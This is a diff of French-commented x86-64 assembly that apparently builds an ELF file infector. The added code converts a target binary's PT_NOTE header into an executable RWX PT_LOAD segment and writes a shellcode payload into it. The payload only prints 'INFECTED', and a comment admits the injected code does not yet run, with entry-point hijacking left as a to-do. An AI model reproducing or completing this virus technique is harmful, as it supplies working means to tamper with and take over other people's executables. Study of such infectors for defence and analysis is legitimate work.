@@ -9,7 +9,13 @@ section .data
     msg_injected db "Code succesfully injected !", 0xA, 0  
     msg_pt_note_modified db "PT_NOTE converted to PT_LOAD and saved", 0xA, 0 
     fichier db "CopySafeBinary", 0 		; Nom du fichier cible                       
-    buffer_size equ 20                                     
+    buffer_size equ 20    
+
+	payload db 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d,
+  			db 0x35, 0x13, 0x00, 0x00, 0x00, 0xba, 0x09, 0x00, 0x00, 0x00, 0x0f, 0x05,
+  			db 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x0f, 0x05, 0x00, 0x00,
+			db 0x49, 0x4e, 0x46, 0x45, 0x43, 0x54, 0x45, 0x44, 0x0a    
+	payload_size equ $ - payload
 
  
 section .bss
@@ -116,11 +122,11 @@ programm_header_loop:
     cmp eax, PT_NOTE            ; Header est un PT_NOTE ?
     jne not_pt_note      		; Si non, on jump à not_pt_note
 
-	lea rdi, [msg_found_pt_note] ; Affichage message 'PT_note found'
+	lea rdi, [msg_found_pt_note]
 	call print_message
 
-	; --- PT_note to PT_load ---
-	mov dword [programm_header], 1 	; Ecriture du nouveau type de programme (PT_LOAD)
+	; --- Modification PT_note en PT_load ---
+	mov dword [programm_header], 1 	; Changement PT_NOTE en PT_LOAD
 	mov dword [programm_header + 4], 7 ; Ecriture des nouvelles permissions RWX
 
 	; Ecriture du p_header modifié dans le fichier ELF
@@ -128,9 +134,37 @@ programm_header_loop:
     mov rdi, [fd]         ; Charge le descripteur de fichier (fd)
     lea rsi, [programm_header] ; Charge l'adresse du programme header dans rsi
     mov rdx, 56           ; Taille de l'en-tête
-    syscall               
-    
-    jmp exit_loop         ; Quitte la boucle et sort
+    syscall      
+
+	lea rdi, [msg_pt_note_modified] 
+	call print_message     
+
+	; ----------------------------------------------------------------------------
+	; --- --- Injection de code --- ---
+	; ----------------------------------------------------------------------------
+
+	; L'INFECTION FONCTIONNE MAIS LE CODE N'EST PAS EXECUTEE
+	; Récupération de l'adresse virtuelle
+	mov rax, qword [programm_header + 16] ; p_vaddr
+	mov [injection_address], rax    
+
+	mov rax, qword [programm_header + 8] ; p_offset
+	mov rsi, rax                        ; Offset pour l’injection
+
+	mov rdi, [fd]          ; Descripteur de fichier
+	mov rax, 8             ; Syscall: lseek
+	xor rdx, rdx
+	syscall
+
+	mov rax, 1             ; Syscall: write
+	lea rsi, [payload]     ; Charge l'adresse du payload
+	mov rdx, payload_size  ; Taille du payload
+	syscall
+
+	; changer le curseur de e_entry sur le début du infected
+	; remettre le curseur 
+
+    jmp exit_loop        
 
 ; -------------------------------------------------------------------------------------------
 ; --- Fonctions Utilitaires ---
